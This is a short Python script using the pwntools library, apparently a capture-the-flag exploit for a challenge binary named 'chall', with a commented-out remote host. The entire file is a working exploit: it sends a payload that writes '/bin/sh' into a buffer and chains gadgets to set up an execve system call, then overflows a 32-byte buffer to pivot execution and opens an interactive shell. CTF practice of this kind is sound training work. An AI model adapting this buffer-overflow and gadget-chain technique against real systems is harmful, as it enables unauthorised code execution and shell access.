#!/usr/bin/env python3



from pwn import *


e = ELF("./chall")
r = process("./chall")
#r = remote("gc1.eng.run",31517)
exploit = b"/bin/sh\x00"  + p64(e.sym["gadgets"] + 8) + p64(0x3b) + p64(e.sym["gadgets"]+10) + p64(e.sym["buffer"]) + p64(e.sym["gadgets"] + 12) + p64(0) + p64(e.sym["gadgets"] + 14) + p64(0) + p64(e.sym["gadgets"] + 16)
r.sendline(exploit)
exploit = b"A" * 32 + p64(e.sym["buffer"]) + p64(0x4012a8)
r.sendline(exploit)
r.interactive()